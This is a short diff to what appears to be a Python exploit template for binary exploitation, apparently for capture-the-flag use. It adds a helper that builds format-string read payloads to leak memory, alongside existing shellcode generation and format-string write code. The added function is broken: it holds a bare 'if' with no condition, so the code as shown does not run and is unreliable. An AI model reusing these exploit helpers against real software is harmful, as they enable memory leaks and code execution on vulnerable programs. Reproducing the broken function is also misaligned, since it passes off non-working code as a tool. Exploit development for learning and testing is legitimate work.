@@ -99,6 +99,8 @@ def main():
     shellcode = GENERATE_SHELLCODE()
     # libc_base = puts_leak - libc.symbols["puts"]
 
+    if args.FMT_READ:
+        payload = FMT_READ(9)
 
     if args.FMT_PAYLOAD:
         payload = FMT_PAYLOAD()
@@ -207,7 +209,12 @@ def get_offset_as_int(s):
     else:
         return int(s)
 
-    
+
+def FMT_READ(offset):
+    if 
+    return f'%{offset}$0{ELF_FILE.bytes * 2}lx'
+
+
 def FMT_PAYLOAD():
     #fmtstr_payload(offset, {addr: value, addr2: value2}, numbwritten=0, write_size='int|short|byte|')
     #   offset (int) – the first formatter’s offset you control (You can check that manuall or auto with args.FMT)
